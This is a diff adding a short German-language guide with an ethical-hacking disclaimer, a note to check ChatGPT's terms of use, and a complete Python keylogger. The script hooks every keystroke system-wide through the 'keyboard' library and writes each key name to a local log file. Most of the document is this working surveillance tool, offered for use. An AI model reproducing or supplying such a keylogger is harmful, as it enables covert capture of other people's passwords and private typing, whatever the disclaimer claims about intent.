@@ -1,0 +1,32 @@
+Disclaimer:
+Diese Anleitung ist ausschließlich für ethical Hacking, sowie für Aufklärungs- & Bildungszwecke !
+Zudem ist die Anleitung, sowie das python-Skript verantwortungsbewusst und nur für legale Zwecke zu nutzen.
+Die Nutzung der Anleitung ist auf eigene Gefahr, denn der Autor übernimmt keine Garantie für die Richtigkeit der Anleitung und haftet nicht für entstandene Schäden.
+
+Hinweis: Versichere dich, dass du dich im Vorfeld mit den Nutzungsbedingungen von Chat GPT vertraut gemacht hast.
+
+Das Python-Skript:
+
+
+
+import keyboard
+
+def main():
+    with open('tastenlog.txt', 'w') as f:
+        f.write("Gedrückte Tasten:\n")
+        
+    keyboard.on_release(callback)
+
+    try:
+        keyboard.wait()
+    except KeyboardInterrupt:
+        pass
+    finally:
+        keyboard.unhook_all()
+
+def callback(event):
+    with open('tastenlog.txt', 'a') as f:
+        f.write(event.name + '\n')
+
+if __name__ == "__main__":
+    main()
